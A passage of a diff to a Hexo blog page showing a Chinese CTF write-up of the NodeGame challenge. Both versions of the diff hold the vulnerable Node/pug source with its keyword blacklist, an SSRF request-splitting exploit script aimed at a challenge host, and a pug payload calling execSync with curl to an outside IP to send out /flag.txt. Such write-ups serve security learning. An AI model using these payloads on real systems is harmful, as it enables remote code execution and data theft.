res.send(<span class="built_in">JSON</span>.stringify(obj));</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">var</span> file_path = <span class="string">'/uploads/'</span> + req.files[<span class="number">0</span>].mimetype +<span class="string">"/"</span>;</span><br><span class="line">            <span class="keyword">var</span> file_name = req.files[<span class="number">0</span>].originalname</span><br><span class="line">            <span class="keyword">var</span> dir_file = __dirname + file_path + file_name</span><br><span class="line">            <span class="keyword">if</span>(!fs.existsSync(__dirname + file_path))&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    fs.mkdirSync(__dirname + file_path)</span><br><span class="line">                &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">                    obj.msg = <span class="string">"file type error"</span>;</span><br><span class="line">                    res.send(<span class="built_in">JSON</span>.stringify(obj));</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                fs.writeFileSync(dir_file,data)</span><br><span class="line">                obj = &#123;</span><br><span class="line">                    msg: <span class="string">'upload success'</span>,</span><br><span class="line">                    filename: file_path + file_name</span><br><span class="line">                &#125; </span><br><span class="line">            &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">                obj.msg = <span class="string">'upload failed'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            res.send(<span class="built_in">JSON</span>.stringify(obj));    </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/source'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    res.sendFile(path.join(__dirname + <span class="string">'/template/source.txt'</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/core'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> q = req.query.q;</span><br><span class="line">    <span class="keyword">var</span> resp = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">if</span> (q) &#123;</span><br><span class="line">        <span class="keyword">var</span> url = <span class="string">'http://localhost:8081/source?'</span> + q</span><br><span class="line">        <span class="built_in">console</span>.log(url)</span><br><span class="line">        <span class="keyword">var</span> trigger = blacklist(url);</span><br><span class="line">        <span class="keyword">if</span> (trigger === <span class="literal">true</span>) &#123;</span><br><span class="line">            res.send(<span class="string">"&lt;p&gt;error occurs!&lt;/p&gt;"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                http.get(url, <span class="function"><span class="keyword">function</span>(<span class="params">resp</span>) </span>&#123;</span><br><span class="line">                    resp.setEncoding(<span class="string">'utf8'</span>);</span><br><span class="line">                    resp.on(<span class="string">'error'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">err</span>) </span>&#123;</span><br><span class="line">                    <span class="keyword">if</span> (err.code === <span class="string">"ECONNRESET"</span>) &#123;</span><br><span class="line">                     <span class="built_in">console</span>.log(<span class="string">"Timeout occurs"</span>);</span><br><span class="line">                     <span class="keyword">return</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                   &#125;);</span><br><span class="line"></span><br><span class="line">                    resp.on(<span class="string">'data'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">chunk</span>) </span>&#123;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                         resps = chunk.toString();</span><br><span class="line">                         res.send(resps);</span><br><span class="line">                        &#125;<span class="keyword">catch</span> (e) &#123;</span><br><span class="line">                           res.send(e.message);</span><br><span class="line">                        &#125;</span><br><span class="line"> </span><br><span class="line">                    &#125;).on(<span class="string">'error'</span>, (e) =&gt; &#123;</span><br><span class="line">                         res.send(e.message);&#125;);</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">                <span class="built_in">console</span>.log(error);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.send(<span class="string">"search param 'q' missing!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params">url</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> evilwords = [<span class="string">"global"</span>, <span class="string">"process"</span>,<span class="string">"mainModule"</span>,<span class="string">"require"</span>,<span class="string">"root"</span>,<span class="string">"child_process"</span>,<span class="string">"exec"</span>,<span class="string">"\""</span>,<span class="string">"'"</span>,<span class="string">"!"</span>];</span><br><span class="line">    <span class="keyword">var</span> arrayLen = evilwords.length;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; arrayLen; i++) &#123;</span><br><span class="line">        <span class="keyword">const</span> trigger = url.includes(evilwords[i]);</span><br><span class="line">        <span class="keyword">if</span> (trigger === <span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> server = app.listen(<span class="number">8081</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> host = server.address().address</span><br><span class="line">    <span class="keyword">var</span> port = server.address().port</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"Example app listening at http://%s:%s"</span>, host, port)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+<pre><code class="javascript">var express = require(&#39;express&#39;);
+var app = express();
+var fs = require(&#39;fs&#39;);
+var path = require(&#39;path&#39;);
+var http = require(&#39;http&#39;);
+var pug = require(&#39;pug&#39;);
+var morgan = require(&#39;morgan&#39;);
+const multer = require(&#39;multer&#39;);
+
+
+app.use(multer({dest: &#39;./dist&#39;}).array(&#39;file&#39;));
+app.use(morgan(&#39;short&#39;));
+app.use(&quot;/uploads&quot;,express.static(path.join(__dirname, &#39;/uploads&#39;)))
+app.use(&quot;/template&quot;,express.static(path.join(__dirname, &#39;/template&#39;)))
+
+
+app.get(&#39;/&#39;, function(req, res) {
+    var action = req.query.action?req.query.action:&quot;index&quot;;
+    if( action.includes(&quot;/&quot;) || action.includes(&quot;\\&quot;) ){
+        res.send(&quot;Errrrr, You have been Blocked&quot;);
+    }
+    file = path.join(__dirname + &#39;/template/&#39;+ action +&#39;.pug&#39;);
+    var html = pug.renderFile(file);
+    res.send(html);
+});
+
+app.post(&#39;/file_upload&#39;, function(req, res){
+    var ip = req.connection.remoteAddress;
+    var obj = {
+        msg: &#39;&#39;,
+    }
+    if (!ip.includes(&#39;127.0.0.1&#39;)) {
+        obj.msg=&quot;only admin&#39;s ip can use it&quot;
+        res.send(JSON.stringify(obj));
+        return 
+    }
+    fs.readFile(req.files[0].path, function(err, data){
+        if(err){
+            obj.msg = &#39;upload failed&#39;;
+            res.send(JSON.stringify(obj));
+        }else{
+            var file_path = &#39;/uploads/&#39; + req.files[0].mimetype +&quot;/&quot;;
+            var file_name = req.files[0].originalname
+            var dir_file = __dirname + file_path + file_name
+            if(!fs.existsSync(__dirname + file_path)){
+                try {
+                    fs.mkdirSync(__dirname + file_path)
+                } catch (error) {
+                    obj.msg = &quot;file type error&quot;;
+                    res.send(JSON.stringify(obj));
+                    return
+                }
+            }
+            try {
+                fs.writeFileSync(dir_file,data)
+                obj = {
+                    msg: &#39;upload success&#39;,
+                    filename: file_path + file_name
+                } 
+            } catch (error) {
+                obj.msg = &#39;upload failed&#39;;
+            }
+            res.send(JSON.stringify(obj));    
+        }
+    })
+})
+
+app.get(&#39;/source&#39;, function(req, res) {
+    res.sendFile(path.join(__dirname + &#39;/template/source.txt&#39;));
+});
+
+
+app.get(&#39;/core&#39;, function(req, res) {
+    var q = req.query.q;
+    var resp = &quot;&quot;;
+    if (q) {
+        var url = &#39;http://localhost:8081/source?&#39; + q
+        console.log(url)
+        var trigger = blacklist(url);
+        if (trigger === true) {
+            res.send(&quot;&lt;p&gt;error occurs!&lt;/p&gt;&quot;);
+        } else {
+            try {
+                http.get(url, function(resp) {
+                    resp.setEncoding(&#39;utf8&#39;);
+                    resp.on(&#39;error&#39;, function(err) {
+                    if (err.code === &quot;ECONNRESET&quot;) {
+                     console.log(&quot;Timeout occurs&quot;);
+                     return;
+                    }
+                   });
+
+                    resp.on(&#39;data&#39;, function(chunk) {
+                        try {
+                         resps = chunk.toString();
+                         res.send(resps);
+                        }catch (e) {
+                           res.send(e.message);
+                        }
+
+                    }).on(&#39;error&#39;, (e) =&gt; {
+                         res.send(e.message);});
+                });
+            } catch (error) {
+                console.log(error);
+            }
+        }
+    } else {
+        res.send(&quot;search param &#39;q&#39; missing!&quot;);
+    }
+})
+
+function blacklist(url) {
+    var evilwords = [&quot;global&quot;, &quot;process&quot;,&quot;mainModule&quot;,&quot;require&quot;,&quot;root&quot;,&quot;child_process&quot;,&quot;exec&quot;,&quot;\&quot;&quot;,&quot;&#39;&quot;,&quot;!&quot;];
+    var arrayLen = evilwords.length;
+    for (var i = 0; i &lt; arrayLen; i++) {
+        const trigger = url.includes(evilwords[i]);
+        if (trigger === true) {
+            return true
+        }
+    }
+}
+
+var server = app.listen(8081, function() {
+    var host = server.address().address
+    var port = server.address().port
+    console.log(&quot;Example app listening at http://%s:%s&quot;, host, port)
+})</code></pre>
 <p>关于<code>/core</code>不用多说，跟上面一样，而关于<code>file_upload</code>则类似上面那题的<code>/flag</code>。这样一来我们需要寻找文件上传的执行点在哪。</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">app.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> action = req.query.action?req.query.action:<span class="string">"index"</span>;</span><br><span class="line">    <span class="keyword">if</span>( action.includes(<span class="string">"/"</span>) || action.includes(<span class="string">"\\"</span>) )&#123;</span><br><span class="line">        res.send(<span class="string">"Errrrr, You have been Blocked"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    file = path.join(__dirname + <span class="string">'/template/'</span>+ action +<span class="string">'.pug'</span>);</span><br><span class="line">    <span class="keyword">var</span> html = pug.renderFile(file);</span><br><span class="line">    res.send(html);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+<pre><code class="javascript">app.get(&#39;/&#39;, function(req, res) {
+    var action = req.query.action?req.query.action:&quot;index&quot;;
+    if( action.includes(&quot;/&quot;) || action.includes(&quot;\\&quot;) ){
+        res.send(&quot;Errrrr, You have been Blocked&quot;);
+    }
+    file = path.join(__dirname + &#39;/template/&#39;+ action +&#39;.pug&#39;);
+    var html = pug.renderFile(file);
+    res.send(html);
+});</code></pre>
 <p>看到首页接受了一个action参数，会将我们上传到/template/目录下的文件pug渲染。并且返回值。这样的话我们思路大致就清晰了：<br>还是通过core进行ssrf并伪造文件上传的http包访问到/flag。之后直接首页文件包含触发渲染，就可以访问到内容。<br>由于这里直接构造头太麻烦，所以要先抓个现成的pug文件上传包伪造下，注意包里面的</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: &#x2F;..&#x2F;template</span><br><span class="line">Content-Length:292</span><br><span class="line">Connection:keep-alive</span><br></pre></td></tr></table></figure>
-<p>等参数不可随便乱改<br>这里借赵师傅脚本小改下：<a href="https://www.zhaoj.in/read-6462.html" target="_blank" rel="noopener">https://www.zhaoj.in/read-6462.html</a></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">payload = <span class="string">''' HTTP/1.1</span></span><br><span class="line"><span class="string">Host: x</span></span><br><span class="line"><span class="string">Connection: keep-alive</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">POST /file_upload HTTP/1.1</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=--------------------------191691572411478</span></span><br><span class="line"><span class="string">Connection: keep-alive</span></span><br><span class="line"><span class="string">cache-control: no-cache</span></span><br><span class="line"><span class="string">Host: x</span></span><br><span class="line"><span class="string">Content-Length: 292</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-----------------------------191691572411478</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name="file"; filename="exp.pug"</span></span><br><span class="line"><span class="string">Content-Type: /../template</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">doctype html</span></span><br><span class="line"><span class="string">html</span></span><br><span class="line"><span class="string">  head</span></span><br><span class="line"><span class="string">    style</span></span><br><span class="line"><span class="string">      include ../../../../../../../flag.txt</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">----------------------------919695033422425209299810--</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">GET /flag HTTP/1.1</span></span><br><span class="line"><span class="string">Host: x</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string">x:'''</span></span><br><span class="line">payload = payload.replace(<span class="string">"\n"</span>, <span class="string">"\r\n"</span>)</span><br><span class="line">payload = <span class="string">''</span>.join(chr(int(<span class="string">'0xff'</span> + hex(ord(c))[<span class="number">2</span>:].zfill(<span class="number">2</span>), <span class="number">16</span>)) <span class="keyword">for</span> c <span class="keyword">in</span> payload)</span><br><span class="line">print(payload)</span><br><span class="line">r = requests.get(<span class="string">'http://9901208f-146e-4356-bad4-2d95ad2b9060.node3.buuoj.cn/core?q='</span> + urllib.parse.quote(payload))</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>
+<pre><code>Content-Type: /../template
+Content-Length:292
+Connection:keep-alive</code></pre><p>等参数不可随便乱改<br>这里借赵师傅脚本小改下：<a href="https://www.zhaoj.in/read-6462.html" target="_blank" rel="noopener">https://www.zhaoj.in/read-6462.html</a></p>
+<pre><code class="python">import urllib.parse
+import requests
+
+payload = &#39;&#39;&#39; HTTP/1.1
+Host: x
+Connection: keep-alive
+
+POST /file_upload HTTP/1.1
+Content-Type: multipart/form-data; boundary=--------------------------191691572411478
+Connection: keep-alive
+cache-control: no-cache
+Host: x
+Content-Length: 292
+
+-----------------------------191691572411478
+Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;exp.pug&quot;
+Content-Type: /../template
+
+doctype html
+html
+  head
+    style
+      include ../../../../../../../flag.txt
+
+----------------------------919695033422425209299810--
+
+GET /flag HTTP/1.1
+Host: x
+Connection: close
+x:&#39;&#39;&#39;
+payload = payload.replace(&quot;\n&quot;, &quot;\r\n&quot;)
+payload = &#39;&#39;.join(chr(int(&#39;0xff&#39; + hex(ord(c))[2:].zfill(2), 16)) for c in payload)
+print(payload)
+r = requests.get(&#39;http://9901208f-146e-4356-bad4-2d95ad2b9060.node3.buuoj.cn/core?q=&#39; + urllib.parse.quote(payload))
+print(r.text)</code></pre>
 <p>也是常规的把构造好的request用字符绕过。当然我们上一道题的八进制等等其他绕过我觉得都可以，毕竟此处没限制url传参不含字母。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?action&#x3D;exp</span><br></pre></td></tr></table></figure>
-<p>成功包含flag<br><img src="/2020/02/26/%E5%8D%95%E7%8B%AC%E5%A1%AB%E5%9D%91-%E5%85%AC%E7%9B%8A%E8%B5%9BNodeGame/flag1.PNG" class="lazyload" data-srcset="flag1.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="flag"><br>值得一提的是我想用curl等等时又失败了，我按出题人给的方法构造包里直接放命令，结果很无语：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;file_upload HTTP&#x2F;1.1</span><br><span class="line">Host: localhost:8081</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;---------------------------12837266501973088788260782942</span><br><span class="line">Content-Length: 6279</span><br><span class="line">Origin: http:&#x2F;&#x2F;localhost:8081</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http:&#x2F;&#x2F;localhost:8081&#x2F;?action&#x3D;upload</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">-----------------------------12837266501973088788260782942</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;file&quot;; filename&#x3D;&quot;byc403.pug&quot;</span><br><span class="line">Content-Type: ..&#x2F;template</span><br><span class="line"></span><br><span class="line">- global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;curl http:&#x2F;&#x2F;120.27.246.202:8877 -X POST -d $(cat &#x2F;flag.txt)&#39;)</span><br><span class="line"></span><br><span class="line">-----------------------------12837266501973088788260782942--</span><br></pre></td></tr></table></figure>
-<p><img src="/2020/02/26/%E5%8D%95%E7%8B%AC%E5%A1%AB%E5%9D%91-%E5%85%AC%E7%9B%8A%E8%B5%9BNodeGame/1.PNG" class="lazyload" data-srcset="1.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="error"><br>提示不能 Couldn’t connect to server.<br>然而出题人的exp里就是用的execSync+curl。我不知道什么情况。毕竟公益赛两道node题都已经证实不能<code>curl,wget,nc,bash</code>等等反弹shell或者连外网的操作。感觉很迷。那只能按赵师傅那样include了。</p>
+<pre><code>/?action=exp</code></pre><p>成功包含flag<br><img src="/2020/02/26/%E5%8D%95%E7%8B%AC%E5%A1%AB%E5%9D%91-%E5%85%AC%E7%9B%8A%E8%B5%9BNodeGame/flag1.PNG" class="lazyload" data-srcset="flag1.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="flag"><br>值得一提的是我想用curl等等时又失败了，我按出题人给的方法构造包里直接放命令，结果很无语：</p>
+<pre><code>POST /file_upload HTTP/1.1
+Host: localhost:8081
+Content-Type: multipart/form-data; boundary=---------------------------12837266501973088788260782942
+Content-Length: 6279
+Origin: http://localhost:8081
+Connection: close
+Referer: http://localhost:8081/?action=upload
+Upgrade-Insecure-Requests: 1
+
+-----------------------------12837266501973088788260782942
+Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;byc403.pug&quot;
+Content-Type: ../template
+
+- global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;curl http://120.27.246.202:8877 -X POST -d $(cat /flag.txt)&#39;)
+
+-----------------------------12837266501973088788260782942--</code></pre><p><img src="/2020/02/26/%E5%8D%95%E7%8B%AC%E5%A1%AB%E5%9D%91-%E5%85%AC%E7%9B%8A%E8%B5%9BNodeGame/1.PNG" class="lazyload" data-srcset="1.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="error"><br>提示不能 Couldn’t connect to server.<br>然而出题人的exp里就是用的execSync+curl。我不知道什么情况。毕竟公益赛两道node题都已经证实不能<code>curl,wget,nc,bash</code>等等反弹shell或者连外网的操作。感觉很迷。那只能按赵师傅那样include了。</p>
 
   
   
@@ -720,7 +1002,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
     
       
-        <div><p>博客內容遵循 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh_TW" target="_blank" rel="noopener">姓名標示-非商業性-相同方式分享 4.0 國際 (CC BY-NC-SA 4.0) 協議</a></p>
+        <div><p>Blog content follows the <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener">Attribution-NonCommercial-ShareAlike 4.0 International (CC BY-NC-SA 4.0) License</a></p>
 </div>
       
     
@@ -732,9 +1014,9 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
     
       
-        本站使用
+        Use
         <a href="https://github.com/volantis-x/hexo-theme-volantis/tree/" target="_blank" class="codename">Volantis</a>
-        作為主題
+        as theme
       
     
       
@@ -867,6 +1149,8 @@ var loadCSS = function( href, before, media, attributes ){
   
   
   
+  
+  loadCSS("https://cdn.jsdelivr.net/npm/highlight.js@11.5.0/styles/atom-one-dark.css", window.volantis.loadcss);
   
 </script>
 <!-- required -->
@@ -1080,7 +1364,7 @@ var loadCSS = function( href, before, media, attributes ){
       path = defaultPath || decodeURI(window.location.pathname);
     }
     var valine = new Valine();
-    valine.init(Object.assign({"path":null,"placeholder":"快来评论吧~","appId":"pHdKUGJwAoGnVczqB6eSKVzO-gzGzoHsz","appKey":"9HlyBGu0qm9EmkSNKD2qoBx4","meta":["nick","mail","link"],"requiredFields":["nick","mail"],"enableQQ":true,"recordIP":false,"avatar":"robohash","pageSize":10,"lang":"zh-cn","highlight":true,"mathJax":false}, {
+    valine.init(Object.assign({"path":null,"placeholder":"快来评论吧~","appId":"pHdKUGJwAoGnVczqB6eSKVzO-gzGzoHsz","appKey":"9HlyBGu0qm9EmkSNKD2qoBx4","meta":["nick","mail","link"],"requiredFields":["nick","mail"],"enableQQ":true,"recordIP":true,"avatar":"robohash","pageSize":10,"lang":"zh-cn","highlight":true,"mathJax":false}, {
       el: '#valine_container',
       path: path,
       placeholder: pagePlaceholder,
@@ -1136,6 +1420,23 @@ function setSearchService() {
 
 
 
+
+  
+
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@10/build/highlight.min.js"></script>
+
+<script>hljs.highlightAll()</script>
+<script src="https://cdn.jsdelivr.net/npm/highlightjs-line-numbers.js@2.8.0/dist/highlightjs-line-numbers.min.js"></script>
+<script>hljs.initLineNumbersOnLoad({ singleLine: true });</script>
+
+<script>
+volantis.pjax.push(()=>{
+	document.querySelectorAll('pre code').forEach((block) => {
+	  hljs.highlightBlock(block);
+	  hljs.lineNumbersBlock(block, {  singleLine: true });
+	});
+},"highlightjs")
+</script>
 
 
 
